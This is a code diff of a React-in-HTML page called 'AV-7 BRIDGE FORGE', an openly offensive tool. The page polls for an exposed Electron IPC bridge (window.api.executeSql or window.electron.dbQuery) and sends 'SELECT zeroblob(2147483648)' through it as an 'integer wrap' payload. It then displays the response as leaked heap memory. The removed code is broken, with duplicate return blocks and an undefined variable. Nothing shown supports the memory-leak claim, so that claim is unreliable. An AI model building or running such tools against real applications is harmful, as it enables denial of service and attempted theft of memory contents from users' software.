@@ -8,10 +8,12 @@
     <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
     <style>
         body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
-        .terminal { border: 1px solid #00ff41; padding: 20px; background: #000; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); }
-        button { background: #00ff41; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        button:disabled { background: #333; color: #666; cursor: not-allowed; }
-        pre { background: #111; padding: 10px; border-left: 3px solid #00ff41; overflow-x: auto; white-space: pre-wrap; font-size: 12px; }
+        .terminal { border: 1px solid #00ff41; padding: 20px; background: #000; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); max-width: 800px; margin: auto; }
+        button { background: #00ff41; color: #000; border: none; padding: 12px 25px; font-weight: bold; cursor: pointer; margin-top: 10px; width: 100%; transition: 0.3s; }
+        button:hover:not(:disabled) { background: #fff; box-shadow: 0 0 20px #00ff41; }
+        button:disabled { background: #222; color: #555; cursor: not-allowed; }
+        pre { background: #050505; padding: 15px; border: 1px solid #333; overflow-x: auto; white-space: pre-wrap; font-size: 11px; color: #fff; margin-top: 10px; }
+        .status-box { border: 1px solid #333; padding: 10px; flex: 1; text-align: center; }
     </style>
 </head>
 <body>
@@ -19,84 +21,70 @@
 
     <script type="text/babel">
         function App() {
-        const [logs, setLogs] = React.useState([]);
-        const [dump, setDump] = React.useState("");
-        const [isVulnerable, setIsVulnerable] = React.useState(false);
-    
-        // This "Scanner" runs every 1 second to look for the bridge
-        React.useEffect(() => {
-            const scanner = setInterval(() => {
+            const [logs, setLogs] = React.useState([]);
+            const [dump, setDump] = React.useState("");
+            const [isVulnerable, setIsVulnerable] = React.useState(false);
+
+            const addLog = (m) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${m}`, ...prev]);
+
+            // SCANNER: Runs every 1s to look for window.api or window.electron
+            React.useEffect(() => {
+                const scanner = setInterval(() => {
+                    const hasBridge = !!(window.api?.executeSql || window.electron?.dbQuery);
+                    if (hasBridge && !isVulnerable) {
+                        setIsVulnerable(true);
+                        addLog("CRITICAL: IPC Bridge detected! System vulnerable.");
+                    } else if (!hasBridge && isVulnerable) {
+                        setIsVulnerable(false);
+                    }
+                }, 1000);
+                return () => clearInterval(scanner);
+            }, [isVulnerable]);
+
+            const runForge = async () => {
                 const bridge = window.api?.executeSql || window.electron?.dbQuery;
-                if (bridge && !isVulnerable) {
-                    setIsVulnerable(true);
-                    addLog("DETECTED: IPC Bridge discovered in global namespace!");
+                addLog("Initiating Integer Wrap Payload (2GB)...");
+                
+                try {
+                    // This triggers the SQLite/Electron memory leak
+                    const result = await bridge("SELECT zeroblob(2147483648) AS leak");
+                    setDump(JSON.stringify(result, null, 2));
+                    addLog("SUCCESS: Memory exfiltrated to heap dump below.");
+                } catch (e) {
+                    addLog(`FAIL: Payload rejected. ${e.message}`);
                 }
-            }, 1000);
-            return () => clearInterval(scanner);
-        }, [isVulnerable]);
-    
-        const addLog = (m) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${m}`, ...prev]);
-    
-        const runForge = async () => {
-            const bridge = window.api?.executeSql || window.electron?.dbQuery;
-            addLog("Initiating Forge...");
-            try {
-                const result = await bridge("SELECT zeroblob(2147483648)");
-                setDump(JSON.stringify(result, null, 2));
-                addLog("SUCCESS: Memory exfiltrated.");
-            } catch (e) {
-                addLog(`FAIL: ${e.message}`);
-            }
-        };
+            };
 
-    return (
-        <div className="terminal">
-            <h1>AV-7 BRIDGE FORGE</h1>
-            <div style={{color: isVulnerable ? '#00ff41' : '#ff4141', marginBottom: '20px'}}>
-                STATUS: {isVulnerable ? '● VULNERABLE' : '○ DISCONNECTED'}
-            </div>
-            
-            <button onClick={runForge} disabled={!isVulnerable}>
-                { !isVulnerable ? "WAITING FOR TARGET..." : "EXECUTE FORGE" }
-            </button>
-
-            <div style={{marginTop: '20px', fontSize: '12px'}}>
-                {logs.map((l, i) => <div key={i}>{l}</div>)}
-            </div>
-            {dump && <pre>{dump}</pre>}
-        </div>
-    );
-}
             return (
                 <div className="terminal">
-                    <h1 style={{color: '#fff', textShadow: '0 0 10px #00ff41'}}>AV-7 BRIDGE FORGE</h1>
+                    <h1 style={{color: '#fff', textShadow: '0 0 10px #00ff41', margin: '0 0 20px 0'}}>AV-7 BRIDGE FORGE</h1>
                     
                     <div style={{display: 'flex', gap: '10px', marginBottom: '20px'}}>
-                        <div style={{border: '1px solid #333', padding: '10px', flex: 1}}>
-                            <small>ENGINE STATUS</small>
-                            <div style={{color: bridge ? '#00ff41' : '#ff4141'}}>
-                                {bridge ? '● VULNERABLE' : '○ DISCONNECTED'}
+                        <div className="status-box">
+                            <small style={{color: '#888'}}>ENGINE STATUS</small>
+                            <div style={{color: isVulnerable ? '#00ff41' : '#ff4141', fontWeight: 'bold'}}>
+                                {isVulnerable ? '● VULNERABLE' : '○ DISCONNECTED'}
                             </div>
                         </div>
-                        <div style={{border: '1px solid #333', padding: '10px', flex: 1}}>
-                            <small>PAYLOAD</small>
-                            <div>INT32_WRAP_2GB</div>
+                        <div className="status-box">
+                            <small style={{color: '#888'}}>EXPLOIT TYPE</small>
+                            <div style={{color: '#fff'}}>INT32_WRAP</div>
                         </div>
                     </div>
                     
-                    <button onClick={runForge} disabled={!bridge}>
-                        { !bridge ? "WAITING FOR TARGET..." : "EXECUTE FORGE" }
+                    <button onClick={runForge} disabled={!isVulnerable}>
+                        { !isVulnerable ? "WAITING FOR IPC BRIDGE..." : "EXECUTE FORGE" }
                     </button>
             
-                    <h3>Real-time Logs:</h3>
-                    <div style={{height: '120px', overflowY: 'auto', background: '#050505', padding: '10px', fontSize: '12px', border: '1px solid #222'}}>
-                        {logs.length === 0 && <div>[SYSTEM] Listening for window.api / window.electron namespaces...</div>}
-                        {logs.map((l, i) => <div key={i} style={{opacity: i === 0 ? 1 : 0.5}}>{l}</div>)}
+                    <h3 style={{marginBottom: '5px', fontSize: '14px'}}>Activity Log:</h3>
+                    <div style={{height: '150px', overflowY: 'auto', background: '#050505', padding: '10px', fontSize: '12px', border: '1px solid #222'}}>
+                        {logs.length === 0 && <div style={{color: '#444'}}>[SYSTEM] Listening for window.api / window.electron...</div>}
+                        {logs.map((l, i) => <div key={i} style={{opacity: i === 0 ? 1 : 0.6, marginBottom: '4px'}}>{l}</div>)}
                     </div>
             
                     {dump && (
                         <div style={{marginTop: '20px'}}>
-                            <h3 style={{color: '#fff'}}>LEAKED HEAP DATA:</h3>
+                            <h3 style={{color: '#fff', fontSize: '14px', margin: '0'}}>LEAKED HEAP DATA:</h3>
                             <pre>{dump}</pre>
                         </div>
                     )}
